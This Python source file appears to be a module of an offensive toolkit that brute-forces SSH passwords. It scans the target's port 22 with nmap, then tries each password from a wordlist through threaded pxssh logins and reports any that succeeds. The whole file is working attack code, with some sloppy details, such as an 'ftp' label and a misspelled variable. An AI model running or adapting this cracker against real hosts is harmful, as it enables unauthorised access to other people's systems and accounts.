import threading,nmap,time
from threading import Thread
from pexpect import pxssh
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "ftp",
        "title"       : "Guess the protocol password",
        "module"      : "exploits/crack/password/protocol/ssh",
        "description" : "Guess the protocol password"
}

var.rports     = ['22']

options ={
  "RHOSTS"   : [str(var.rhosts[0]),'Host target'],
  "RPORTS"   : [str(var.rports[0]),'port target'],
  "USERNAME" : [str(var.username[0]),'Username target'],
  "LISTPASS" : [str(var.listpass[0]),'Wordlist']
}

Found = False
Fails = 0

maxConnections = 5
connection_lock = threading.BoundedSemaphore(maxConnections)

def nmapScan(tgtHost):
                                nmapScan = nmap.PortScanner()
                                nmapScan.scan(tgtHost, str(var.rports[0]))
                                state = nmapScan[tgtHost]['tcp'][int(var.rports[0])]['state']
                                return state

def connect(host, user, password, release):
                                global Found
                                global Fails
                                try:
                                        s = pxssh.pxssh()
                                        s.login(host, user, password)
                                        print (green +'[+]'+default+'Password Found: {}'.format(password.decode('utf-8')))
                                        Found = True
                                        s.logout()
                                except Exception as e:
                                        if 'read_nonblocking' in str(e):
                                                Fails += 1
                                                time.sleep(5)
                                                connect(host, user, password, False)
                                        elif 'synchronize with original prompt' in str(e):
                                                time.sleep(1)
                                                connect(host, user, password, False)
                                finally:
                                        if release:
                                                connection_lock.release()


def running():
        try:
                host = var.rhosts[0]
                user = var.username[0]
                passwordFile = var.listpass[0]
                global Found
                global Fails
                print(blue+'[*]'+default+'Checking SSH port state on {}'.format(host))
                if nmapScan(host) == 'open':
                        print(green+'[+]'+default+'SSH port '+str(var.rports[0])+' open on {}'.format(host))
                else:
                        print(red+'[-]'+default+'SSH port '+str(var.rports[0])+' closed on {}'.format(host))
                        print(blue+'[*]'+default+'Exiting Application.\n')

                print(blue+'[*]'+default+'Loading Password File\n')
                try:
                        fn = open(passwordFile, 'rb')
                except Exception as e:
                        print(e)
                for line in fn:
                        if Found:
                                # print('[*] Exiting Password Found')
                                running()
                        elif Fails > 5:
                                print(red+'[-]'+default+'Exiting: Too Many Socket Timeouts')
                        connection_lock.acquire()
                        password = line.strip()
                        print(blue+'[*]'+default+'Testing Password With: {}'.format(password.decode('utf-8')))
                        t = Thread(target=connect, args=(host, user, password, True))
                        t.start()
                while (threading.active_count() > 1):
                        if threading.active_count() == 1 and Found != True:
                                print(red+'[-]'+default+'Password Not Found In Password File.')
                                print(blue+'[*]'+default+'Exiting Application')
                        elif threading.active_count() == 1 and Found == True:
                                print(blue+'[*]'+drfault+'Exiting Application.')


        except Exception as e:
                print(red+"\n[-]"+default+"Error : "+str(e))
